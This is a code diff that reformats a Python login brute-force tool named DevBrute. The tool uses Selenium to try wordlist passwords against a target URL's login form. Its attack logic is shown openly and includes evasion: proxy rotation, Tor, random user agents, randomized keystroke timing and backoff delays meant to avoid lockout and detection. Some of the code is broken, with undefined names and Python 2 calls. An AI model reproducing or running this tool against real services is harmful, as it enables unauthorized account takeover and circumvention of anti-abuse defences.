@@ -1,47 +1,47 @@
 import argparse
+import base64
+import hashlib
+import json
 import os
 import random
-import re
-import sys
-import time
-import urllib
-import urllib.request
-import urllib.parse
-import threading
-import requests
-import socket
-import json
-import hashlib
-import base64
-import signal
-import subprocess
-import webbrowser
-from time import sleep
-from selenium import webdriver
-from selenium.webdriver.common.keys import Keys
-from selenium.webdriver.support.ui import WebDriverWait
-from pyvirtualdisplay import Display
-from proxyscrape import create_collector, get_collector
 
 # Define avoidance patterns
 import re
+import signal
+import socket
+import subprocess
+import sys
+import threading
+import time
+import urllib
+import urllib.parse
+import urllib.request
+import webbrowser
+from time import sleep
+
+import requests
+from proxyscrape import create_collector, get_collector
+from pyvirtualdisplay import Display
+from selenium import webdriver
+from selenium.webdriver.common.keys import Keys
+from selenium.webdriver.support.ui import WebDriverWait
 
 avoidance_patterns = [
-    r'^[0-9]+$',  # Avoid using all numeric passwords
-    r'^[a-zA-Z]+$',  # Avoid using all alphabetic passwords
-    r'^[a-zA-Z0-9]+$',  # Avoid using alphanumeric patterns
+    r"^[0-9]+$",  # Avoid using all numeric passwords
+    r"^[a-zA-Z]+$",  # Avoid using all alphabetic passwords
+    r"^[a-zA-Z0-9]+$",  # Avoid using alphanumeric patterns
     # Add more patterns as needed
 ]
 
 # Define proxies
 proxies = [
-    'http://1.1.1.1:8080',
-    'http://2.2.2.2:8080',
+    "http://1.1.1.1:8080",
+    "http://2.2.2.2:8080",
     # Add more proxies as needed
 ]
 
 # Set up a proxy collector (for proxy rotation)
-proxy_collector = create_collector('my_collector', 'http')
+proxy_collector = create_collector("my_collector", "http")
 
 
 class Bruter:
@@ -92,7 +92,7 @@ class Bruter:
     def webBruteforce(self, username, wordlist, service, delay):
         print("\n- Bruteforce starting ( Delay = %s sec ) -\n" % self.delay)
         driver = webdriver.Firefox()
-        wordlist = open(wordlist, 'r')
+        wordlist = open(wordlist, "r")
 
         unsuccessful_attempts = 0
 
@@ -107,34 +107,46 @@ class Bruter:
                 unsuccessful_attempts += 1
 
                 # Calculate the delay based on the number of unsuccessful attempts
-                progressive_delay = min(delay * (2 ** unsuccessful_attempts), max_delay)
+                progressive_delay = min(delay * (2**unsuccessful_attempts), max_delay)
 
                 # Add a randomized delay (with a maximum value)
                 randomized_delay = random.uniform(0, progressive_delay)
 
                 # Rotate Proxy
                 proxy = random.choice(proxies)
-                webdriver.DesiredCapabilities.FIREFOX['proxy'] = {
+                webdriver.DesiredCapabilities.FIREFOX["proxy"] = {
                     "httpProxy": proxy,
                     "ftpProxy": proxy,
                     "sslProxy": proxy,
-                    "proxyType": "MANUAL"
+                    "proxyType": "MANUAL",
                 }
 
                 # Change User-Agent header
                 user_agent = ua_generator.random
                 headers = {"User-Agent": user_agent}
-                driver.execute_cdp_cmd('Network.setUserAgentOverride', {"userAgent": user_agent})
+                driver.execute_cdp_cmd(
+                    "Network.setUserAgentOverride", {"userAgent": user_agent}
+                )
 
                 # Randomize keystroke timing
                 for char in password:
                     elem.send_keys(char)
-                    time.sleep(random.uniform(0.1, 0.5))  # Random delay between keystrokes
+                    time.sleep(
+                        random.uniform(0.1, 0.5)
+                    )  # Random delay between keystrokes
 
                 elem.send_keys(Keys.RETURN)
 
             except AssertionError:
-                print(G + ("  Username: {} \t| Password found: {}\n".format(username,password)) + W)
+                print(
+                    G
+                    + (
+                        "  Username: {} \t| Password found: {}\n".format(
+                            username, password
+                        )
+                    )
+                    + W
+                )
                 driver.quit()
                 self.stopTOR()
 
@@ -145,26 +157,30 @@ class Bruter:
 
 
 # DevBrute Banner
-print("""\033[1;37m
+print(
+    """\033[1;37m
  _____             ____             _       
 |  __ \           |  _ \           | |      
 | |  | | _____   _| |_) |_ __ _   _| |_ ___ 
 | |  | |/ _ \ \ / /  _ <| '__| | | | __/ _ \\
 | |__| |  __/\ V /| |_) | |  | |_| | ||  __/
-|_____/ \___| \_/ |____/|_|   \__,_|\__\___|""")
+|_____/ \___| \_/ |____/|_|   \__,_|\__\___|"""
+)
 
-url = input('\033[1;34m[?]\033[0m Enter target URL: ')
+url = input("\033[1;34m[?]\033[0m Enter target URL: ")
 reload(sys)
-sys.setdefaultenciding('utf8')
+sys.setdefaultencoding("utf8")
 
 
 def main():
-    parser = argparse.ArgumentParser(description='BruteForce Framework written by Devprogramming')
-    required = parser.add_argument_group('required arguments')
-    required.add_argument('-s', '--service', dest='service', required=True)
-    required.add_argument('-u', '--username', dest='username', required=True)
-    required.add_argument('-w', '--wordlist', dest='password', required=True)
-    parser.add_argument('-d', '--delay', type=int, dest='delay')
+    parser = argparse.ArgumentParser(
+        description="BruteForce Framework written by Devprogramming"
+    )
+    required = parser.add_argument_group("required arguments")
+    required.add_argument("-s", "--service", dest="service", required=True)
+    required.add_argument("-u", "--username", dest="username", required=True)
+    required.add_argument("-w", "--wordlist", dest="password", required=True)
+    parser.add_argument("-d", "--delay", type=int, dest="delay")
 
     args = parser.parse_args()
 
@@ -187,7 +203,7 @@ def main():
     br.execute()
 
 
-if __name__ == '__main__':
+if __name__ == "__main__":
     try:
         main()
     except KeyboardInterrupt:
